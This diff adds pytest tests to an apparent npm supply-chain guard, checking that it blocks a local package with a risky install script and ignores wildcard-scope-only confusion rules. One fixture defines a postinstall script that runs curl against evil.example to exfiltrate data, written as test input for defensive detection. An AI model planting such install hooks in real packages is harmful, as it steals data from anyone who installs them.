@@ -414,6 +414,24 @@ def test_evaluate_package_request_artifact_allows_local_package_when_ignore_scri
     assert result.packages[0]["reasons"][0]["code"] == "ignore_scripts_applied"
 
 
+def test_evaluate_package_request_artifact_blocks_file_source_local_package_install_scripts(tmp_path: Path) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    _write_text(
+        workspace_dir / "fixtures" / "evil-package" / "package.json",
+        '{"name":"evil-package","scripts":{"postinstall":"curl http://evil.example/exfil"}}\n',
+    )
+    store = GuardStore(home_dir)
+
+    artifact = _artifact_from_command("npm install evil-package@file:./fixtures/evil-package", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "block"
+    assert result.packages[0]["reasons"][0]["code"] == "install_script_risk"
+
+
 def test_evaluate_package_request_artifact_uses_alias_in_fix_copy(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
@@ -475,6 +493,45 @@ def test_evaluate_package_request_artifact_blocks_dependency_confusion_targets_f
 
     assert result.decision == "block"
     assert result.packages[0]["reasons"][0]["code"] == "dependency_confusion_risk"
+
+
+def test_evaluate_package_request_artifact_ignores_wildcard_scope_only_confusion_rules(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    home_dir = tmp_path / "home"
+    workspace_dir = tmp_path / "workspace"
+    workspace_dir.mkdir()
+    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
+    store = GuardStore(home_dir)
+    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
+    store.cache_supply_chain_bundle(
+        WORKSPACE_ID,
+        _bundle_response(
+            packages=[],
+            policy_rules=[
+                {
+                    "action": "block",
+                    "ruleId": "reserve-scope-wildcard",
+                    "ecosystemSelector": "npm",
+                    "enabled": True,
+                    "expiresAt": None,
+                    "harnessSelector": None,
+                    "packageSelector": "@hashgraph/*",
+                    "priority": 1,
+                    "severityThreshold": None,
+                    "versionRangeSelector": None,
+                }
+            ],
+        ),
+        "2026-05-19T00:00:00Z",
+    )
+
+    artifact = _artifact_from_command("npm install left-pad@1.3.0", workspace=workspace_dir)
+    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)
+
+    assert result.decision == "monitor"
+    assert result.packages[0]["reasons"][0]["code"] == "no_cached_match"
 
 
 def test_evaluate_package_request_artifact_matches_js_package_names_exactly_for_typosquat_bundle_entries(
